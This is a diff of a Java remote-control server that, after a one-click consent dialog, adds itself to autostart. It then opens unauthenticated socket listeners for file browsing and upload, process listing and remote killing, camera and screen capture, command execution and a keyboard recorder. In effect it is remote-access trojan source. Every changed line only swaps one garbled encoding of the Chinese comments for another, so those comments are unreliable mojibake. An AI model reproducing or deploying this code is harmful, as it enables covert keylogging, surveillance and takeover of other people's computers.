@@ -15,24 +15,24 @@ import java.util.ArrayList;
 public class Server {
     private static int port_file = 6666;
     private static int port_proc = 6667;
-    private static int port_camera = 6668;// å„ä¸ªçº¿ç¨‹çš„ç«¯å£è®¾ç½®
+    private static int port_camera = 6668;// ¸÷¸öÏß³ÌµÄ¶Ë¿ÚÉèÖÃ
 
     public static void main(String args[]) throws IOException {
 
         int res = JOptionPane.showConfirmDialog(null,
-                "Do you want to be controlled?", "è¿œç¨‹æ§åˆ¶",
+                "Do you want to be controlled?", "Ô¶³Ì¿ØÖÆ",
                 JOptionPane.YES_NO_OPTION);
         if (res == JOptionPane.YES_OPTION) {
-            System.out.println("é€‰æ‹©æ˜¯åæ‰§è¡Œçš„ä»£ç "); // ç‚¹å‡»â€œæ˜¯â€åæ‰§è¡Œè¿™ä¸ªä»£ç å—
-            auto_run auto_run=new auto_run(); //åŠ å…¥è‡ªå¯åŠ¨
+            System.out.println("Ñ¡ÔñÊÇºóÖ´ĞĞµÄ´úÂë"); // µã»÷¡°ÊÇ¡±ºóÖ´ĞĞÕâ¸ö´úÂë¿é
+            auto_run auto_run=new auto_run(); //¼ÓÈë×ÔÆô¶¯
         } else {
-            System.out.println("é€‰æ‹©å¦åæ‰§è¡Œçš„ä»£ç "); // ç‚¹å‡»â€œå¦â€åæ‰§è¡Œè¿™ä¸ªä»£ç å—
+            System.out.println("Ñ¡Ôñ·ñºóÖ´ĞĞµÄ´úÂë"); // µã»÷¡°·ñ¡±ºóÖ´ĞĞÕâ¸ö´úÂë¿é
             System.exit(1);
             return;
         }
 
         try {
-            // è¿›ç¨‹å¼€å¯æ—¶è‡ªåŠ¨å¼€å§‹å›¾åƒè®°å½•
+            // ½ø³Ì¿ªÆôÊ±×Ô¶¯¿ªÊ¼Í¼Ïñ¼ÇÂ¼
             Thread thread_screenCapture = new Thread() {
                 public void run() {
                     try {
@@ -43,37 +43,37 @@ public class Server {
                     }
                 }
             };
-            thread_screenCapture.start(); // æ–°å¼€ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œå±å¹•è®°å½•
+            thread_screenCapture.start(); // ĞÂ¿ªÒ»¸öÏß³ÌÖ´ĞĞÆÁÄ»¼ÇÂ¼
 
             Thread_Pool thread_Pool1 = new Thread_Pool("file");
-            thread_Pool1.start(); // å¼€å¯æ–‡ä»¶ç®¡ç†çº¿ç¨‹
+            thread_Pool1.start(); // ¿ªÆôÎÄ¼ş¹ÜÀíÏß³Ì
 
             Thread_Pool thread_Pool2 = new Thread_Pool("proc");
-            thread_Pool2.start(); // è¿›ç¨‹æ–‡ä»¶ç®¡ç†çº¿ç¨‹
+            thread_Pool2.start(); // ½ø³ÌÎÄ¼ş¹ÜÀíÏß³Ì
 
             Thread_Pool thread_Pool3 = new Thread_Pool("camera");
-            thread_Pool3.start(); // æ‘„åƒå¤´ç®¡ç†çº¿ç¨‹
+            thread_Pool3.start(); // ÉãÏñÍ·¹ÜÀíÏß³Ì
 
             Thread_Pool thread_Pool4 = new Thread_Pool("upload_file");
-            thread_Pool4.start(); // æ–‡ä»¶ä¸Šä¼ çº¿ç¨‹
+            thread_Pool4.start(); // ÎÄ¼şÉÏ´«Ïß³Ì
 
             Thread_Pool thread_Pool5 = new Thread_Pool("screen_monitor");
-            thread_Pool5.start(); // æ‘„åƒå¤´ç®¡ç†çº¿ç¨‹
+            thread_Pool5.start(); // ÉãÏñÍ·¹ÜÀíÏß³Ì
 
             Thread_Pool thread_Pool6 = new Thread_Pool("cmd");
-            thread_Pool6.start(); // æ‘„åƒå¤´ç®¡ç†çº¿ç¨‹
+            thread_Pool6.start(); // ÉãÏñÍ·¹ÜÀíÏß³Ì
 
             Thread_Pool thread_Pool7 = new Thread_Pool("keyboardRecord");
-            thread_Pool7.start(); // æ‘„åƒå¤´ç®¡ç†çº¿ç¨‹//
+            thread_Pool7.start(); // ÉãÏñÍ·¹ÜÀíÏß³Ì//
 
-            //é”®ç›˜è®°å½•æ¨¡å—å¼€å¯
+            //¼üÅÌ¼ÇÂ¼Ä£¿é¿ªÆô
             ServerKeyboardRecord ServerKeyboardRecord=new ServerKeyboardRecord();
 
-            JOptionPane.showMessageDialog(null, "", "æˆåŠŸå¼€å¯æœåŠ¡ç«¯",
+            JOptionPane.showMessageDialog(null, "", "³É¹¦¿ªÆô·şÎñ¶Ë",
                     JOptionPane.OK_OPTION);
         } catch (Exception e) {
 
-            JOptionPane.showMessageDialog(null, "", "æœåŠ¡ç«¯å¼€å¯å¤±è´¥",
+            JOptionPane.showMessageDialog(null, "", "·şÎñ¶Ë¿ªÆôÊ§°Ü",
                     JOptionPane.ERROR_MESSAGE);
             System.exit(1);
             return;
@@ -90,7 +90,7 @@ class Thread_Pool extends Thread {
     private static int port_camera = 6668;
     private static int port_uploarFile = 6669;
     private static int port_cmd = 7888;
-    private static int port_screenMonitor = 8000;// å„ä¸ªçº¿ç¨‹çš„ç«¯å£è®¾ç½®
+    private static int port_screenMonitor = 8000;// ¸÷¸öÏß³ÌµÄ¶Ë¿ÚÉèÖÃ
 
     private String methods;
 
@@ -101,29 +101,29 @@ class Thread_Pool extends Thread {
     @Override
     public void run() {
         if (methods.equals("file")) {
-            // server_FileManagerç±»çš„ä½¿ç”¨
+            // server_FileManagerÀàµÄÊ¹ÓÃ
             server_FileManager server_FileManager = new server_FileManager();
             // server_FileManager.server_getFileName();
             server_FileManager.server_getRootFile();
             server_FileManager.setport(port_file);
-            System.out.println("æ–‡ä»¶ç®¡ç†æœåŠ¡å™¨çš„ç«¯å£æ˜¯ï¼š" + server_FileManager.port);
+            System.out.println("ÎÄ¼ş¹ÜÀí·şÎñÆ÷µÄ¶Ë¿ÚÊÇ£º" + server_FileManager.port);
             server_FileManager.server_file_socketManager();
 
         } else if (methods.equals("proc")) {
-            // server_ProcManagerç±»çš„ä½¿ç”¨
+            // server_ProcManagerÀàµÄÊ¹ÓÃ
             server_ProcManager server_ProcManager = new server_ProcManager();
             server_ProcManager.setport(port_proc);
-            System.out.println("è¿›ç¨‹ç®¡ç†æœåŠ¡å™¨çš„ç«¯å£æ˜¯ï¼š" + server_ProcManager.port);
+            System.out.println("½ø³Ì¹ÜÀí·şÎñÆ÷µÄ¶Ë¿ÚÊÇ£º" + server_ProcManager.port);
             server_ProcManager.server_proc_socketManager();
         } else if (methods.equals("camera")) {
             server_cameraManager server_cameraManager = new server_cameraManager();
             server_cameraManager.setport(port_camera);
-            System.out.println("æ‘„åƒå¤´æœåŠ¡å™¨çš„ç«¯å£æ˜¯ï¼š" + server_cameraManager.port);
+            System.out.println("ÉãÏñÍ··şÎñÆ÷µÄ¶Ë¿ÚÊÇ£º" + server_cameraManager.port);
             server_cameraManager.server_camera_record();
         } else if (methods.equals("upload_file")) {
             server_FileReceive server_FileReceive = new server_FileReceive();
             server_FileReceive.setport(port_uploarFile);
-            System.out.println("æ‘„åƒå¤´æœåŠ¡å™¨çš„ç«¯å£æ˜¯ï¼š" + server_FileReceive.port);
+            System.out.println("ÉãÏñÍ··şÎñÆ÷µÄ¶Ë¿ÚÊÇ£º" + server_FileReceive.port);
             try {
                 server_FileReceive.receive();
             } catch (ClassNotFoundException e) {
@@ -211,11 +211,11 @@ class fileButton {
 
     /*
      * public static void listFile() {
-     * System.out.println("=========æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å¤¹=========="); File fileDirectory
+     * System.out.println("=========Ö¸¶¨Ä¿Â¼ÏÂµÄËùÓĞÎÄ¼ş¼Ğ=========="); File fileDirectory
      * = new File("E:\\"); File[] aa = fileDirectory.listFiles(); for (int i =
      * 0; i < aa.length; i++) { if (aa[i].isDirectory()) {
      * System.out.println(aa[i].toString()); } }
-     * System.out.println("=========æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶=========="); File file = new
+     * System.out.println("=========Ö¸¶¨Ä¿Â¼ÏÂµÄËùÓĞÎÄ¼ş=========="); File file = new
      * File("E:\\"); File[] bb = file.listFiles(); for (int j = 0; j <
      * bb.length; j++) { if (bb[j].isFile()) { System.out.println(bb[j]); } } }
      */
@@ -237,11 +237,11 @@ class server_FileManager {
         this.file_list = new ArrayList<String>();
         /*
          * for (File f : FileSystemView.getFileSystemView().getHomeDirectory()
-         * .listFiles()) { // è·å–â€œæˆ‘çš„ç”µè„‘â€æ–‡ä»¶å¯¹è±¡ if
+         * .listFiles()) { // »ñÈ¡¡°ÎÒµÄµçÄÔ¡±ÎÄ¼ş¶ÔÏó if
          * (f.getName().equals("::{20D04FE0-3AEA-1069-A2D8-08002B30309D}")) {
          * for (File sf : f.listFiles()) { System.out.println(sf.getPath()); } }
          * }
-         */// è¿™ä¸ªå¯ä»¥è·å–æ›´å¤šçš„ä¿¡æ¯ï¼Œæ¯”å¦‚é™¤äº†ç£ç›˜é©±åŠ¨å™¨ä¹‹å¤–æ ¹ç›®å½•ä¸‹çš„å…¶ä»–è®¾å¤‡
+         */// Õâ¸ö¿ÉÒÔ»ñÈ¡¸ü¶àµÄĞÅÏ¢£¬±ÈÈç³ıÁË´ÅÅÌÇı¶¯Æ÷Ö®Íâ¸ùÄ¿Â¼ÏÂµÄÆäËûÉè±¸
 
         File[] root = File.listRoots();
 
@@ -263,8 +263,8 @@ class server_FileManager {
             if (aa[i].isDirectory()) {
                 this.fileDirectory_list.add(aa[i].toString());
             }
-        }// é€ä¸€è¯»å–ç›®å½•
-        this.fileDirectory_list.sort(null);// å¯¹å¾—åˆ°çš„ç›®å½•æ’åº
+        }// ÖğÒ»¶ÁÈ¡Ä¿Â¼
+        this.fileDirectory_list.sort(null);// ¶ÔµÃµ½µÄÄ¿Â¼ÅÅĞò
 
         File file = new File(route);
         File[] bb = file.listFiles();
@@ -272,8 +272,8 @@ class server_FileManager {
             if (bb[j].isFile()) {
                 this.file_list.add(bb[j].toString());
             }
-        }// é€ä¸€è¯»å–æ–‡ä»¶
-        this.file_list.sort(null);// å¯¹å¾—åˆ°çš„æ–‡ä»¶æ’åº
+        }// ÖğÒ»¶ÁÈ¡ÎÄ¼ş
+        this.file_list.sort(null);// ¶ÔµÃµ½µÄÎÄ¼şÅÅĞò
     }
 
     public void server_file_socketManager() {
@@ -288,10 +288,10 @@ class server_FileManager {
         if (serverSocket != null) {
             while (true) {
                 try {
-                    System.out.println("ç­‰å¾…è¿œç¨‹è¿æ¥ï¼Œç«¯å£å·ä¸ºï¼š"
+                    System.out.println("µÈ´ıÔ¶³ÌÁ¬½Ó£¬¶Ë¿ÚºÅÎª£º"
                             + serverSocket.getLocalPort() + "...");
                     Socket server = serverSocket.accept();
-                    System.out.println("è¿œç¨‹ä¸»æœºåœ°å€ï¼š"
+                    System.out.println("Ô¶³ÌÖ÷»úµØÖ·£º"
                             + server.getRemoteSocketAddress());
                     DataInputStream in = new DataInputStream(
                             server.getInputStream());
@@ -354,10 +354,10 @@ class server_FileReceive {
                         count = count + 1;
                         cache = new File(server_FileManager.route + count);
                     }
-                    System.out.println("ç­‰å¾…è¿œç¨‹è¿æ¥ï¼Œç«¯å£å·ä¸ºï¼š"
+                    System.out.println("µÈ´ıÔ¶³ÌÁ¬½Ó£¬¶Ë¿ÚºÅÎª£º"
                             + serverSocket.getLocalPort() + "...");
                     Socket server = serverSocket.accept();
-                    System.out.println("è¿œç¨‹ä¸»æœºåœ°å€ï¼š"
+                    System.out.println("Ô¶³ÌÖ÷»úµØÖ·£º"
                             + server.getRemoteSocketAddress());
                     InputStream in = server.getInputStream();
                     FileOutputStream fos = new FileOutputStream(
@@ -397,10 +397,10 @@ class server_ProcManager {
     public void server_getProcName() {
 
         try {
-            // å…ˆæ¸…ç©ºæˆå‘˜å˜é‡
+            // ÏÈÇå¿Õ³ÉÔ±±äÁ¿
             proc_list = new ArrayList<String[]>();
 
-            // å…ˆåˆ›å»ºç³»ç»Ÿè¿›ç¨‹
+            // ÏÈ´´½¨ÏµÍ³½ø³Ì
             ProcessBuilder pb = new ProcessBuilder("tasklist");
             Process p = null;
             p = pb.start();
@@ -409,22 +409,22 @@ class server_ProcManager {
                     Charset.forName("GB2312")));
             BufferedReader err = new BufferedReader(new InputStreamReader(
                     new BufferedInputStream(p.getErrorStream())));
-            System.out.println("Window ç³»ç»Ÿè¿›ç¨‹åˆ—è¡¨");
+            System.out.println("Window ÏµÍ³½ø³ÌÁĞ±í");
             String ostr;
 
-            // è¾“å‡ºæœ¬åœ°è¿›ç¨‹
+            // Êä³ö±¾µØ½ø³Ì
             int line = 0;
             while ((ostr = out.readLine()) != null) {
-                if (line != 2 && line != 3)// å»é™¤ç¬¬äºŒã€ä¸‰è¡Œçš„ä¸éœ€è¦éƒ¨åˆ†
+                if (line != 2 && line != 3)// È¥³ıµÚ¶ş¡¢ÈıĞĞµÄ²»ĞèÒª²¿·Ö
                 {
 
-                    String[] cacheStrings = ostr.split("\\s{1,}", 5); // ç¬¬ä¸€è¡Œä¸ºè¡¨æ ¼å¤´éƒ¨ï¼Œç”¨ä¸€ä¸ªç©ºæ ¼åˆ†å‰²
+                    String[] cacheStrings = ostr.split("\\s{1,}", 5); // µÚÒ»ĞĞÎª±í¸ñÍ·²¿£¬ÓÃÒ»¸ö¿Õ¸ñ·Ö¸î
                     this.proc_list.add(cacheStrings);
 
                 }
                 line++;
             }
-            this.proc_list.remove(0);// å»é™¤ç¬¬ä¸€ä¸ªä¸å¿…è¦çš„å…ƒç´ 
+            this.proc_list.remove(0);// È¥³ıµÚÒ»¸ö²»±ØÒªµÄÔªËØ
             /*
              * for (int j = 1; j < this.proc_list.size() - 1; j++) { for (int i
              * = 0; i < this.proc_list.size() - 1 - j; i++) { if
@@ -435,7 +435,7 @@ class server_ProcManager {
 
             String estr = null;
 
-            // å¦‚æœæœ‰ï¼Œåˆ™è¾“å‡ºé”™è¯¯ä¿¡æ¯
+            // Èç¹ûÓĞ£¬ÔòÊä³ö´íÎóĞÅÏ¢
             try {
                 estr = err.readLine();
             } catch (IOException e) {
@@ -465,31 +465,31 @@ class server_ProcManager {
         if (serverSocket != null) {
             while (true) {
                 try {
-                    System.out.println("ç­‰å¾…è¿œç¨‹è¿æ¥ï¼Œç«¯å£å·ä¸ºï¼š"
+                    System.out.println("µÈ´ıÔ¶³ÌÁ¬½Ó£¬¶Ë¿ÚºÅÎª£º"
                             + serverSocket.getLocalPort() + "...");
                     Socket server = serverSocket.accept();
-                    System.out.println("è¿œç¨‹ä¸»æœºåœ°å€ï¼š"
+                    System.out.println("Ô¶³ÌÖ÷»úµØÖ·£º"
                             + server.getRemoteSocketAddress());
                     DataInputStream in = new DataInputStream(
                             server.getInputStream());
                     String cache = in.readUTF().toString();
-                    /* åˆ·æ–°æ“ä½œ */
+                    /* Ë¢ĞÂ²Ù×÷ */
                     if (cache.equals("refresh")) {
-                        server_getProcName();// å…ˆå†æ¬¡è·å–æœ¬åœ°è¿›ç¨‹ï¼Œåˆ·æ–°æ•°æ®
-                        // å°†æ•°æ®ä¼ è¾“ç»™å¯¹æ–¹
+                        server_getProcName();// ÏÈÔÙ´Î»ñÈ¡±¾µØ½ø³Ì£¬Ë¢ĞÂÊı¾İ
+                        // ½«Êı¾İ´«Êä¸ø¶Ô·½
                         ObjectOutputStream out = new ObjectOutputStream(
                                 server.getOutputStream());
                         out.writeObject(this.proc_list);
                     }
-                    /* åˆ·æ–°æ“ä½œ */
-                    /* åˆ é™¤æ“ä½œ */
+                    /* Ë¢ĞÂ²Ù×÷ */
+                    /* É¾³ı²Ù×÷ */
                     else {
                         ObjectOutputStream out = new ObjectOutputStream(
                                 server.getOutputStream());
 
                         Process process = null;
                         BufferedReader reader = null;
-                        try { // æ€æ‰è¿›ç¨‹ process =
+                        try { // É±µô½ø³Ì process =
 
                             Runtime.getRuntime().exec(
                                     "taskkill /F /PID " + cache);
@@ -519,7 +519,7 @@ class server_ProcManager {
 
                         System.out.println(cache);
                     }
-                    /* åˆ é™¤æ“ä½œ */
+                    /* É¾³ı²Ù×÷ */
                     serverSocket.setSoTimeout(300000);
                     server.close();
                 } catch (SocketTimeoutException s) {
@@ -562,7 +562,7 @@ class auto_run{
     static String path= null;
 
     public auto_run() throws IOException{
-        System.out.println("å°†åŠ æœ¬æ–‡ä»¶åŠ å…¥è‡ªå¯åŠ¨ï¼š"+"server.jar");
+        System.out.println("½«¼Ó±¾ÎÄ¼ş¼ÓÈë×ÔÆô¶¯£º"+"server.jar");
         name="server.jar";
         File file=new File(".");
         path=file.getCanonicalPath()+"\\";
